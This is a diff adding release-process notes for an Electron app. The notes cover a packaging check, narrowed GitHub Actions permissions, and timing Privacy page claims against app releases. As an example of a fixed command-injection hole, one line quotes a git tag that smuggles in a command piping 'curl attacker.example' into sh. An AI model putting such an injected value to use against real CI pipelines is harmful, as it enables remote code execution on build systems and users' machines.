@@ -264,3 +264,72 @@ resumes normally on the release after that, once `appId` is stable again.
   look.
 - **Windows is unsigned**, so SmartScreen warns on first install ("More info" → "Run anyway").
 - **No automated UI tests.** Everything in gate 1's smoke list is manual.
+
+---
+
+## Added 2026-09-04, after the security pass
+
+### A fifth gate, for anything that touches packaging
+
+The four gates (typecheck, lint, test, build) cannot see a packaging-level failure. Two were hit in
+one session on changes that read as obviously correct, and both would have shipped:
+
+- an `electronFuses` change produced a macOS `.app` that **did not launch at all** — no window, no
+  dialog, empty stdout, exit 0 — because flipping a fuse invalidates the ad-hoc code signature;
+- a CSP change silently blocked `index.html`'s inline pre-paint script, so the app would have opened
+  on the wrong theme, every launch, for everyone, with no error anywhere.
+
+So: **if a release contains a change to `electron-builder.yml`, `electron.vite.config.ts`'s CSP
+plugin, the Electron fuses, or `main/index.ts`'s window setup, run `npm run package:dir` and open
+the result before tagging.** On macOS also run `spctl -a -vvv` on the packaged `.app` — "rejected"
+is the expected answer for an unsigned build, but *"code has no resources but signature indicates
+they must be present"* means the binary was modified after signing and will not start.
+
+### The release workflow's permissions changed
+
+`release.yml` now declares `permissions: contents: read` at workflow level, with `contents: write`
+on only the two jobs that need it (`create-release`, `build`), and `persist-credentials: false` on
+the `verify` checkout. If a future job needs to create or modify a Release, it must ask for
+`contents: write` itself — the previous blanket grant meant `npm ci`, which runs install scripts
+from every package in the lockfile, ran next to a token that could publish a Release. Since a
+Release is what every installed copy auto-updates from, and the build is unsigned, that turned a
+dependency compromise directly into code execution on users' machines.
+
+The tag name is also no longer interpolated into a `run:` block — it is passed through `env:` and
+the derived channel is validated against `^[A-Za-z0-9.-]+$`. `${{ }}` substitution happens before
+bash sees the script, so a tag such as `v1.0.0-a;curl attacker.example|sh;x` was arbitrary command
+execution in the one job holding the Release-write token.
+
+**Both changes only prove out on a real tag.** Nothing in a local run exercises them, so the first
+release after this lands is the test: watch that `create-release` still creates the Release and
+that both `build` matrix jobs still upload their assets. If either fails with a permissions error,
+the fix is to add the missing `permissions:` block to that job, not to restore the blanket grant.
+
+### When a page on the site makes a claim about how the APP behaves
+
+Raised 2026-09-04 by the session writing the Terms/Privacy pages, and it is a new class of hazard
+worth naming, because the two halves of this project ship on completely different triggers:
+
+- `site/` deploys to Vercel on **every push to `main`**.
+- The app reaches a user only on a **pushed `v*` tag**, and then only once that user's copy has
+  actually auto-updated.
+
+So a sentence on the Privacy page such as *"note content makes no third-party requests"* — which is
+true because of the CSP and embed allowlist added in the 2026-09-04 security pass — becomes a
+**published claim about software nobody is running yet** the moment `site/` is pushed. It stays
+untrue for every existing install until they update.
+
+**The rule: a site page may only claim app behaviour that is already in `releases/latest`.** Two
+ways to honour it, both fine:
+
+1. Tag the release first, let it publish, then push the site change. Simplest when the two are
+   ready together.
+2. Word the claim so it is true of the version it describes — *"From 1.0.2, notes load pictures
+   only from your own vault"* — rather than as a timeless statement about the product.
+
+What must NOT happen is pushing `main` with both changes in it and assuming they land together.
+They do not: the site is live in about a minute and the app is live whenever the tag is pushed and
+each user's six-hourly check finds it.
+
+The same trap applies in reverse to anything on the site that describes a feature still sitting in
+`CHANGELOG.md`'s `[Unreleased]` — the waiting area is for the app, not for the site.
